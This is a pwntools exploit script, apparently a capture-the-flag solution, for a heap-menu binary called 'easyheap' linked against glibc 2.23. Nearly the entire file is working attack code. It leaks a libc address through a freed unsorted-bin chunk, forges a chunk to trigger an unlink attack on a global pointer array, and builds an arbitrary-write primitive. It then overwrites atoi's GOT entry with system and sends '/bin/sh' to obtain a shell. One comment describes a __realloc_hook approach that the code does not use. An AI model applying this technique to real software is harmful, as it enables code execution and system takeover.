#!/usr/env/bin python3
from pwn import *

context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

def debug_on():
	if (DEBUG):
		context.log_level = "debug"
	
g_fname = "./easyheap"
g_elf = ELF(g_fname)
g_libcname = "./libc-2.23.so"

if (LOCAL):
	g_libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	g_io = process(g_fname)
else:
	g_libc = ELF(g_libcname)
	g_io = remote()

def getpid():
	if (LOCAL & DEBUG):
		log.info("pid: %d" % g_io.proc.pid)
		pause()
	
def opt(idx):
	g_io.sendafter("Your choice:", str(idx))	

def add(size, content):
	opt(1)
	g_io.sendafter("Input group size:", str(size))
	g_io.sendafter("Input group member:", content)

def show(idx):
	opt(2)
	g_io.sendafter("Input group index:", str(idx))
	
def change(idx, size, content):
	opt(3)
	g_io.sendafter("Input group index:", str(idx))
	g_io.sendafter("Input group name:", str(size))
	g_io.sendafter("Input group member:", content)

def remove(idx):
	opt(4)
	g_io.sendafter("Input group index:", str(idx))

def exit():
	opt(5)

def pwn():
	debug_on()
	# 1. unsorted bin to leak arena's address -> calculate base of glibc
	add(0x80, "aaa") # 0
	add(0x80, "bbb") # 1
	remove(0)

    # leak address of main arena
	show(0)
	g_io.recvuntil("0 : ")
	res = g_io.recvline()[:6]
	addr_arena = u64(res.ljust(8, b"\x00")) - 88
	log.success("addr_arena = %#x" % addr_arena)

	off_arena = 0x3c4b20
	libc_base = addr_arena - off_arena
	addr_system = libc_base + g_libc.symbols["system"]

	log.success("libc@%#x\nsystem@%#x" % (libc_base, addr_system))
	remove(1)	# now all chunks have been freed.

	# 2. fastbin attack: allocate to __realloc_hook, write one_gadget to it, then get shell
	add(0x90, "ccc") # 2
	add(0x90, "ddd") # 3
	add(0x90, "eee") # 4
	add(0x20, "fff") # 5

	g_list = 0x6020a0
	fake_fd = g_list + (0x10*3) + 8 - (3*8)
	fake_bk = g_list + (0x10*3) + 8 - (2*8)
	payload_unlink = flat([
		0, 0x91, fake_fd, fake_bk,  'a' * (0x90-0x20), # fake chunk in chunk 3
		0x90, 0xa0,  # chunk4
	])
	change(3, len(payload_unlink) + 1, payload_unlink)
	getpid()
	remove(4)   # trigger unlink

	payload_hijack = flat([0x90, g_list + 8, 0x90, g_list + 0x18])
	change(3, len(payload_unlink), payload_hijack)

	# define write_to()
	def write_to(addr, size, data):
		change(3, 8, p64(addr))
		change(1, size, data)	
	
	write_to(g_elf.got["atoi"], 8, p64(addr_system))
	
	#getpid()
	# getshell
	g_io.sendafter("Your choice:", "/bin/sh")

if "__main__" == __name__:
	pwn()
	g_io.interactive()
